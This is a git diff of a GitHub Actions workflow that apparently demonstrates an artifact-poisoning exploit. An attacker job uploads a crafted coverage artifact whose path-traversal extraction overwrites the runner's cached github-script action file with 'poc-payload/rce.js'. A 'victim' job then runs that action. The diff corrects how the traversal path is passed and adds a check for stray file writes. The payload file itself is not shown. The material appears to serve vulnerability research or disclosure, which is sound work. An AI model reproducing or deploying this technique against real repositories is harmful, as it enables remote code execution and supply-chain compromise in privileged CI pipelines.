@@ -21,10 +21,13 @@ jobs:
         run: npm install @actions/artifact@2.3.2 --no-save --silent
       - name: Upload crafted "coverage-report-ubuntu-latest-*" artifact
         uses: ./.github/actions/plant
+        env:
+          # the plant action reads process.env.INPUT_EXTRACT_DIR (its `extract-dir` input
+          # becomes INPUT_EXTRACT-DIR, so set the env var explicitly)
+          INPUT_EXTRACT_DIR: "../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x"
         with:
           name: coverage-report-ubuntu-latest-20.x
           pairs: "poc-payload/rce.js->/home/runner/work/_actions/actions/github-script/v7/dist/index.js"
-          extract-dir: "../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x"
 
   victim:
     name: "privileged consumer job (shape of the reusable workflow)"
@@ -48,6 +51,8 @@ jobs:
           echo "== target action file =="
           ls -l /home/runner/work/_actions/actions/github-script/v7/dist/index.js || true
           head -3 /home/runner/work/_actions/actions/github-script/v7/dist/index.js || true
+          echo "== stray writes under runner work =="
+          find /home/runner/work -maxdepth 6 -name 'index.js' -newermt '-10 minutes' 2>/dev/null | sort
       - name: Innocent action step
         uses: actions/github-script@v7
         with:
